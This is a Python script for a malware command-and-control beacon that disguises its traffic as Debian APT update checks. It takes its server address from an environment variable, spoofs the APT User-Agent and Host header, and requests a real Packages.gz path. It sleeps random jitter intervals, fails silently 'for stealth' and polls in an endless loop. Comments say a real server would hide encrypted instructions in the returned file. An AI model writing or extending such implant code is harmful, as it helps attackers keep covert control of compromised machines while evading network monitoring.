import requests
import time
import random
import os

class Conversation:
    def __init__(self, fallback_c2="http://deb.debian.org"):
        # Real-world: Fetch C2 from OOB signaling or Environment
        self.c2_url = os.getenv("ENI_C2_URL", fallback_c2)
        self.user_agent = "Debian APT-HTTP/1.3 (2.2.4) non-interactive"

    def send_heartbeat(self):
        # Adaptive Jitter: Mimic natural workstation update checks
        # apt usually checks every few hours, but during 'updates' it's frequent
        jitter = random.uniform(30, 300)
        time.sleep(jitter)

        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/plain, text/html",
            "Host": "deb.debian.org" # SNI Spoofing
        }

        # Mimic actual Packages.gz request path
        target_path = "/debian/dists/bullseye/main/binary-amd64/Packages.gz"

        try:
            # The 'payload' is embedded in the request headers or response body
            # Here we simulate the GET request
            response = requests.get(f"{self.c2_url}{target_path}", headers=headers, timeout=10)

            if response.status_code == 200:
                # In a real attack, the C2 would return a 'Packages.gz' that
                # actually contains encrypted instructions in the metadata
                return response.content
            return None
        except Exception as e:
            # Silent fail for stealth
            return None

if __name__ == "__main__":
    conv = Conversation()
    while True:
        data = conv.send_heartbeat()
        if data:
            # Process instructions...
            pass
